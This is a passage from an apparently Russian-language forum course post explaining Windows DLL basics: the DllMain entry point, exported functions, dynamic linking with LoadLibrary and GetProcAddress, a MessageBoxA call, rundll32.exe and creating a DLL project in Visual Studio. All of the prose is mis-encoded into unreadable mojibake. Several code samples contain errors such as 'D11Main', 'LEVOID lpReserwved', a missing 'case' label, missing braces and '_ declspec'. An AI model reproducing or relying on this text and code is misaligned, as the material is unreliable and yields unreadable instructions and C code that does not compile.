–ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç–∏ —Å–∏—Å—Ç–µ–º—ã.<br />
<br />
–°–ª–µ–¥—É—é—â–µ–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç, –∫–∞–∫ kernel32.dll –∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è –ø–æ –æ–¥–Ω–æ–º—É –∏ —Ç–æ–º—É –∂–µ –∞–¥—Ä–µ—Å—É (0x7fff9fad0000) —Å—Ä–µ–¥–∏ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö —Ä–∞–±–æ—Ç–∞—é—â–∏—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤.<br />
<br />
–í —Ç–∞–∫–æ–π —Å–∏—Ç—É–∞—Ü–∏–∏ –∫–æ–¥–æ–≤–∞—è –æ–±–ª–∞—Å—Ç—å —É –≤—Å–µ—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –±—É–¥–µ—Ç –æ–¥–Ω–∞, –Ω–æ –¥–∞–Ω–Ω—ã–µ –±—É–¥—É—Ç —Ä–∞–∑–Ω—ã–µ, —É –∫–∞–∂–¥–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ —Å–≤–æ–∏.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746731880866.png"
		data-src="https://osint42.org/attachments/1746731880866-png.45/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746731880866-png.45/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746731880866.png"
			title="1746731880866.png"
			width="839" height="168" loading="lazy" />
	</div><br />
<br />
<b>–ó–∞—á–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å DLL?</b><br />
<br />
–ï—Å—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –ø—Ä–∏—á–∏–Ω, –ø–æ—á–µ–º—É DLL —Ç–∞–∫ —á–∞—Å—Ç–æ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –≤ Windows:<br />
<ol>
<li data-xf-list-type="ol">–ú–æ–¥—É–ª—å–Ω–æ—Å—Ç—å –∫–æ–¥–∞ - –≤–º–µ—Å—Ç–æ –æ–¥–Ω–æ–≥–æ –æ–≥—Ä–æ–º–Ω–æ–≥–æ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–≥–æ —Ñ–∞–π–ª–∞, —Å–æ–¥–µ—Ä–∂–∞—â–µ–≥–æ –≤—Å—é —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—å, –∫–æ–¥ –¥–µ–ª–∏—Ç—Å—è –Ω–∞ –Ω–µ—Å–∫–æ–ª—å–∫–æ –Ω–µ–∑–∞–≤–∏—Å–∏–º—ã—Ö –±–∏–±–ª–∏–æ—Ç–µ–∫, –∫–∞–∂–¥–∞—è –∏–∑ –∫–æ—Ç–æ—Ä—ã—Ö —Ñ–æ–∫—É—Å–∏—Ä—É–µ—Ç—Å—è –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω–æ—Å—Ç–∏. –ú–æ–¥—É–ª—å–Ω–æ—Å—Ç—å —É–ø—Ä–æ—â–∞–µ—Ç —Ä–∞–±–æ—Ç—É —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–æ–≤ –≤–æ –≤—Ä–µ–º—è —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ –∏ –æ—Ç–ª–∞–¥–∫–∏.</li>
<li data-xf-list-type="ol">–ü–æ–≤—Ç–æ—Ä–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫–æ–¥–∞ - DLL —Å–ø–æ—Å–æ–±—Å—Ç–≤—É—é—Ç –ø–æ–≤—Ç–æ—Ä–Ω–æ–º—É –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é –∫–æ–¥–∞, —Ç–∞–∫ –∫–∞–∫ –±–∏–±–ª–∏–æ—Ç–µ–∫—É –º–æ–∂–Ω–æ –≤—ã–∑—ã–≤–∞—Ç—å –∏–∑ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤.</li>
<li data-xf-list-type="ol">–≠—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –ø–∞–º—è—Ç–∏ - –∫–æ–≥–¥–∞ –Ω–µ—Å–∫–æ–ª—å–∫–æ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –Ω—É–∂–¥–∞—é—Ç—Å—è –≤ –æ–¥–Ω–æ–π –∏ —Ç–æ–π –∂–µ DLL, –æ–Ω–∏ –º–æ–≥—É—Ç —ç–∫–æ–Ω–æ–º–∏—Ç—å –ø–∞–º—è—Ç—å, —Ä–∞–∑–¥–µ–ª—è—è —ç—Ç—É DLL, –≤–º–µ—Å—Ç–æ —Ç–æ–≥–æ —á—Ç–æ–±—ã –∑–∞–≥—Ä—É–∂–∞—Ç—å –µ–µ –≤ –ø–∞–º—è—Ç—å –ø—Ä–æ—Ü–µ—Å—Å–∞.</li>
</ol><b>–¢–æ—á–∫–∞ –≤—Ö–æ–¥–∞ –≤ DLL</b><br />
<br />
DLL –º–æ–≥—É—Ç –ø–æ –∂–µ–ª–∞–Ω–∏—é —É–∫–∞–∑—ã–≤–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏—é —Ç–æ—á–∫–∏ –≤—Ö–æ–¥–∞, –∫–æ—Ç–æ—Ä–∞—è –≤—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–¥, –∫–æ–≥–¥–∞ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–∞—è –∑–∞–¥–∞—á–∞, –Ω–∞–ø—Ä–∏–º–µ—Ä, –∫–æ–≥–¥–∞ –ø—Ä–æ—Ü–µ—Å—Å –∑–∞–≥—Ä—É–∂–∞–µ—Ç –±–∏–±–ª–∏–æ—Ç–µ–∫—É DLL.<br />
<br />
–ï—Å—Ç—å 4 –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ –¥–ª—è –≤—ã–∑–æ–≤–∞ —Ç–æ—á–∫–∏ –≤—Ö–æ–¥–∞:<br />
<ol>
<li data-xf-list-type="ol">–ó–∞–≥—Ä—É–∑–∫–∞ –ø—Ä–æ—Ü–µ—Å—Å–æ–º DLL.</li>
<li data-xf-list-type="ol">–°–æ–∑–¥–∞–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–æ–º –Ω–æ–≤–æ–≥–æ –ø–æ—Ç–æ–∫–∞.</li>
<li data-xf-list-type="ol">–ù–æ—Ä–º–∞–ª—å–Ω—ã–π –≤—ã—Ö–æ–¥ –ø–æ—Ç–æ–∫–∞.</li>
<li data-xf-list-type="ol">–í—ã–≥—Ä—É–∑–∫–∞ –ø—Ä–æ—Ü–µ—Å—Å–æ–º DLL.</li>
</ol>–ü—Ä–∏–º–µ—Ä –∫–æ–¥–∞ DLL<br />
<br />
–ö–æ–¥ –Ω–∏–∂–µ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç —Ç–∏–ø–∏—á–Ω—É—é —Å—Ç—Ä—É–∫—Ç—É—Ä—É –∫–æ–¥–∞ DLL.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>BOOL APIENTRY D11Main(
HANDLE hModule, // Handle to DLL module
DWORD ul_reason_for_call, // Reason for calling function
LEVOID lpReserwved // Reserved
)
{
switch (ul_reason_for_call)

case DLL_PROCESS_ATTACH: //Load to process
// Do something here
break;

DLL_THREAD_ATTACH: // A a new thread.
// Do socmething here
break;

case DLL_THREAD_DETACH // –ê thread exits normally.
// Do something here
break;

case DLL_PROCESS_DETACH: // A process unloads the DLL.
// Do something here
break;

return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–≠–∫—Å–ø–æ—Ä—Ç —Ñ—É–Ω–∫—Ü–∏–∏</b><br />
<br />
DLL-—Ñ–∞–π–ª—ã –º–æ–≥—É—Ç —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏–∏, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω—ã –≤—ã–∑—ã–≤–∞—é—â–∏–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ–º –∏–ª–∏ –ø—Ä–æ—Ü–µ—Å—Å–æ–º. –ß—Ç–æ–±—ã —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏—é, –æ–Ω–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –∫–ª—é—á–µ–≤—ã—Ö —Å–ª–æ–≤ extern –∏ __declspec(dllexport). –ü—Ä–∏–≤–µ–¥–µ–Ω –Ω–∏–∂–µ –ø—Ä–∏–º–µ—Ä —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ HelloWorld.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>extern _ declspec(dllexport) void HelloWorld() {
// Function code here
}</code></pre>
	</div>
</div><br />
<b>–î–∏–Ω–∞–º–∏—á–µ—Å–∫–æ–µ —Å–≤—è–∑—ã–≤–∞–Ω–∏–µ</b><br />
<br />
–ú–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å WinAPI, —Ç–∞–∫–∏–µ –∫–∞–∫ LoadLibrary, GetModuleHandle –∏ GetProcAddress, —á—Ç–æ–±—ã –∏–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏—é –∏–∑ DLL. –≠—Ç–æ—Ç –ø—Ä–æ—Ü–µ—Å—Å –Ω–∞–∑—ã–≤–∞–µ—Ç—Å—è –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–º —Å–≤—è–∑—ã–≤–∞–Ω–∏–µ–º.<br />
–≠—Ç–æ –º–µ—Ç–æ–¥ –∑–∞–≥—Ä—É–∑–∫–∏ –∏ —Å–≤—è–∑—ã–≤–∞–Ω–∏—è –∫–æ–¥–∞ (DLL) –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è, –∞ –Ω–µ —Å–≤—è–∑—ã–≤–∞–Ω–∏—è –∏—Ö –Ω–∞ —ç—Ç–∞–ø–µ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ —Å –ø–æ–º–æ—â—å—é –∫–æ–º–ø–æ–Ω–æ–≤—â–∏–∫–∞ –∏ —Ç–∞–±–ª–∏—Ü—ã –∞–¥—Ä–µ—Å–æ–≤ –∏–º–ø–æ—Ä—Ç–∞.<br />
<br />
–°—É—â–µ—Å—Ç–≤—É–µ—Ç –Ω–µ—Å–∫–æ–ª—å–∫–æ –ø—Ä–µ–∏–º—É—â–µ—Å—Ç–≤ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–æ–≥–æ —Å–≤—è–∑—ã–≤–∞–Ω–∏—è, –∏—Ö –ø–æ–¥—Ä–æ–±–Ω–æ–µ –æ–ø–∏—Å–∞–Ω–∏–µ –º–æ–∂–Ω–æ –Ω–∞–π—Ç–∏ –≤ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏ Microsoft.<br />
<br />
–í —ç—Ç–æ–º —Ä–∞–∑–¥–µ–ª–µ —Ä–∞—Å—Å–º–∞—Ç—Ä–∏–≤–∞—é—Ç—Å—è —à–∞–≥–∏ –ø–æ –∑–∞–≥—Ä—É–∑–∫–µ DLL, –ø–æ–ª—É—á–µ–Ω–∏—é –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ DLL, –∏–∑–≤–ª–µ—á–µ–Ω–∏—é –∞–¥—Ä–µ—Å–∞ —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –∏ –ø–æ—Å–ª–µ–¥—É—é—â–µ–º—É –≤—ã–∑–æ–≤—É —ç—Ç–æ–π —Ñ—É–Ω–∫—Ü–∏–∏.<br />
<br />
<b>–ó–∞–≥—Ä—É–∑–∫–∞ DLL</b><br />
<br />
–í—ã–∑–æ–≤ —Ñ—É–Ω–∫—Ü–∏–∏, –Ω–∞–ø—Ä–∏–º–µ—Ä MessageBoxA, –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ –∑–∞—Å—Ç–∞–≤–∏—Ç –û–° Windows –∑–∞–≥—Ä—É–∑–∏—Ç—å DLL, —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É—é—â—É—é —Ñ—É–Ω–∫—Ü–∏—é MessageBoxA, –≤ –∞–¥—Ä–µ—Å–Ω–æ–µ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ –ø–∞–º—è—Ç–∏ –≤—ã–∑—ã–≤–∞—é—â–µ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, –≤ –¥–∞–Ω–Ω–æ–º —Å–ª—É—á–∞–µ —ç—Ç–æ user32.dll. –ó–∞–≥—Ä—É–∑–∫–∞ user32.dll –±—ã–ª–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –û–° –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ –ø—Ä–æ—Ü–µ—Å—Å–∞, –∞ –Ω–µ –∫–æ–¥–æ–º.<br />
<br />
–û–¥–Ω–∞–∫–æ –≤ –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö —Å–ª—É—á–∞—è—Ö, —ç—Ç–∞ DLL –º–æ–∂–µ—Ç <b><u>–Ω–µ –±—ã—Ç—å –∑–∞–≥—Ä—É–∂–µ–Ω–∞ –≤ –ø–∞–º—è—Ç—å</u></b>. –ß—Ç–æ–±—ã –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –º–æ–≥–ª–æ –≤—ã–∑–≤–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏—é, –µ–º—É —Å–Ω–∞—á–∞–ª–∞ –Ω—É–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä DLL, —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É—é—â–∏–π —ç—Ç—É —Ñ—É–Ω–∫—Ü–∏—é. –î–ª—è —ç—Ç–æ–≥–æ –ø–æ—Ç—Ä–µ–±—É–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏—é WinAPI LoadLibrary, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>HMODULE hModule = LoadLibraryA(&quot;sampleDLL.d11&quot;); // hMedule now contain sampleDLL.dll&#039;s handle</code></pre>
	</div>
</div><br />
<b>–ü–æ–ª—É—á–µ–Ω–∏–µ –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü–∏–∏</b><br />
<br />
–ü–æ—Å–ª–µ —Ç–æ–≥–æ –∫–∞–∫ DLL –∑–∞–≥—Ä—É–∂–µ–Ω–∞ –≤ –ø–∞–º—è—Ç—å –∏ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –ø–æ–ª—É—á–µ–Ω, —Å–ª–µ–¥—É—é—â–∏–π —à–∞–≥ - —ç—Ç–æ –ø–æ–ª—É—á–µ–Ω–∏–µ –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü–∏–∏. –≠—Ç–æ –¥–µ–ª–∞–µ—Ç—Å—è —Å –ø–æ–º–æ—â—å—é —Ñ—É–Ω–∫—Ü–∏–∏ WinAPI GetProcAddress, –∫–æ—Ç–æ—Ä–∞—è –ø—Ä–∏–Ω–∏–º–∞–µ—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä DLL, —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É—é—â–µ–≥–æ —Ñ—É–Ω–∫—Ü–∏—é, –∏ –∏–º—è —Ñ—É–Ω–∫—Ü–∏–∏.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>PVOID pHelloWorld = GetProcAddress(hModule, &quot;HelloWorld&quot;);</code></pre>
	</div>
</div><br />
<b>–í—ã–∑–æ–≤ —Ñ—É–Ω–∫—Ü–∏–∏</b><br />
<br />
–ü–æ—Å–ª–µ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –∞–¥—Ä–µ—Å–∞ HelloWorld –≤ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π pHelloWorld, —Å–ª–µ–¥—É—é—â–∏–º —à–∞–≥–æ–º —è–≤–ª—è–µ—Ç—Å—è –ø—Ä–∏–≤–µ–¥–µ–Ω–∏–µ —Ç–∏–ø–∞ —ç—Ç–æ–≥–æ –∞–¥—Ä–µ—Å–∞ –∫ —É–∫–∞–∑–∞—Ç–µ–ª—é —Ñ—É–Ω–∫—Ü–∏–∏ HelloWorld. –≠—Ç–æ—Ç —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —Ñ—É–Ω–∫—Ü–∏—é —Ç—Ä–µ–±—É–µ—Ç—Å—è –¥–ª—è –≤—ã–∑–æ–≤–∞ —Ñ—É–Ω–∫—Ü–∏–∏.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>typedef void (WINAPI* HelloWorldFunctionPointer) ();
HelloWorldFunctionPointer HelloWorld = (HelloWorldFunctionPointer)pHelloWorld;
HelloWorld();</code></pre>
	</div>
</div><br />
<b>–ü—Ä–∏–º–µ—Ä –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–æ–≥–æ —Å–≤—è–∑—ã–≤–∞–Ω–∏—è</b><br />
<br />
–ù–∏–∂–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω –µ—â–µ –æ–¥–∏–Ω –ø—Ä–æ—Å—Ç–æ–π –ø—Ä–∏–º–µ—Ä –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–æ–≥–æ —Å–≤—è–∑—ã–≤–∞–Ω–∏—è, –≥–¥–µ –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è MessageBoxA. –ö–æ–¥ –ø—Ä–µ–¥–ø–æ–ª–∞–≥–∞–µ—Ç, —á—Ç–æ user32.dll —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É—é—â–∞—è —ç—Ç—É —Ñ—É–Ω–∫—Ü–∏—é –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω–∞ –≤ –ø–∞–º—è—Ç—å. –ù–∞–ø–æ–º–∏–Ω–∞—é, —á—Ç–æ –µ—Å–ª–∏ DLL –Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω–∞ –≤ –ø–∞–º—è—Ç—å, –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ —ç—Ç–æ–π DLL –≤ –∞–¥—Ä–µ—Å–Ω–æ–µ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ —Ç—Ä–µ–±—É–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ LoadLibrary.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>typedef int (WINAPI* MessageBoxAFunctionPointer)(HWND, LPCSTR, LPCSTR, UINT);
MessageBoxAFunctionPointer pMessageBoxA = (MessageBoxAFunctionPointer)GetProcAddress(LoadLibrary(&quot;user32.dll&quot;), &quot;MessageBoxA&quot;);
if (pMessageBoxA) {
    pMessageBoxA(NULL, &quot;–¢–µ–∫—Å—Ç MessageBox&quot;, &quot;–ó–∞–≥–æ–ª–æ–≤–æ–∫ MessageBox&quot;, 0);
}</code></pre>
	</div>
</div><br />
<b>–£–∫–∞–∑–∞—Ç–µ–ª–∏ –Ω–∞ —Ñ—É–Ω–∫—Ü–∏–∏</b><br />
<br />
–ù–∞ –ø—Ä–æ—Ç—è–∂–µ–Ω–∏–∏ –æ—Å—Ç–∞–≤—à–µ–≥–æ—Å—è –∫—É—Ä—Å–∞ —Ç–∏–ø—ã –¥–∞–Ω–Ω—ã—Ö —É–∫–∞–∑–∞—Ç–µ–ª–µ–π –Ω–∞ —Ñ—É–Ω–∫—Ü–∏–∏ –±—É–¥—É—Ç –∏–º–µ—Ç—å –∏–º–µ–Ω–æ–≤–∞–Ω–∏–µ, –∫–æ—Ç–æ—Ä–æ–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –∏–º—è WinAPI —Å –ø—Ä–µ—Ñ–∏–∫—Å–æ–º fp, —á—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç &quot;—É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —Ñ—É–Ω–∫—Ü–∏—é&quot;. –ù–∞–ø—Ä–∏–º–µ—Ä, –≤—ã—à–µ—É–∫–∞–∑–∞–Ω–Ω—ã–π —Ç–∏–ø –¥–∞–Ω–Ω—ã—Ö MessageBoxAFunctionPointer –±—É–¥–µ—Ç –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω –∫–∞–∫ fpMessageBoxA. –≠—Ç–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —É–ø—Ä–æ—â–µ–Ω–∏—è –∏ –ø–æ–≤—ã—à–µ–Ω–∏—è —è—Å–Ω–æ—Å—Ç–∏ –Ω–∞ –ø—Ä–æ—Ç—è–∂–µ–Ω–∏–∏ –∫—É—Ä—Å–∞.<br />
<br />
<b>Rundll32.exe</b><br />
<br />
–°—É—â–µ—Å—Ç–≤—É–µ—Ç –Ω–µ—Å–∫–æ–ª—å–∫–æ —Å–ø–æ—Å–æ–±–æ–≤ –∑–∞–ø—É—Å–∫–∞ —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π –±–µ–∑ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–≥–æ –º–µ—Ç–æ–¥–∞.<br />
<b>–û–¥–Ω–∞ –∏–∑ –æ–±—â–µ–∏–∑–≤–µ—Å—Ç–Ω—ã—Ö —Ç–µ—Ö–Ω–∏–∫</b> - –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞ rundll32.exe. Rundll32.exe - —ç—Ç–æ –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–π –±–∏–Ω–∞—Ä–Ω–∏–∫ Windows, –∫–æ—Ç–æ—Ä—ã–π –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –∑–∞–ø—É—Å–∫–∞ —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ DLL. –î–ª—è –∑–∞–ø—É—Å–∫–∞ —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Å–ª–µ–¥—É—é—â—É—é –∫–æ–º–∞–Ω–¥—É:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>rundll32.exe &lt;–∏–º—è_dll&gt;, &lt;—ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—É—Å–∫–∞&gt;</code></pre>
	</div>
</div><br />
<b>–°–æ–∑–¥–∞–Ω–∏–µ —Ñ–∞–π–ª–∞ DLL —Å –ø–æ–º–æ—â—å—é Visual Studio</b><br />
<br />
–ß—Ç–æ–±—ã —Å–æ–∑–¥–∞—Ç—å —Ñ–∞–π–ª DLL, –∑–∞–ø—É—Å—Ç–∏—Ç–µ Visual Studio –∏ —Å–æ–∑–¥–∞–π—Ç–µ –Ω–æ–≤—ã–π –ø—Ä–æ–µ–∫—Ç. –ö–æ–≥–¥–∞ –≤–∞–º –±—É–¥—É—Ç –ø—Ä–µ–¥–ª–æ–∂–µ–Ω—ã —à–∞–±–ª–æ–Ω—ã –ø—Ä–æ–µ–∫—Ç–æ–≤, –≤—ã–±–µ—Ä–∏—Ç–µ –æ–ø—Ü–∏—é &quot;Dynamic-Link Library (DLL)&quot;.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746731898327.png"
		data-src="https://osint42.org/attachments/1746731898327-png.46/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746731898327-png.46/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746731898327.png"
			title="1746731898327.png"
			width="1492" height="815" loading="lazy" />
	</div><br />
<br />
–î–∞–ª–µ–µ –±—É–¥—É—Ç —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω—ã —à–∞–±–ª–æ–Ω—ã, –≤ –∫–æ—Ç–æ—Ä—ã—Ö —É–∂–µ –º–æ–∂–Ω–æ –ø–∏—Å–∞—Ç—å –∫–æ–¥ (dllmain.cpp):<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746731906182.png"
		data-src="https://osint42.org/attachments/1746731906182-png.47/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746731906182-png.47/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746731906182.png"
			title="1746731906182.png"
			width="1345" height="370" loading="lazy" />
	</div><br />
<br />
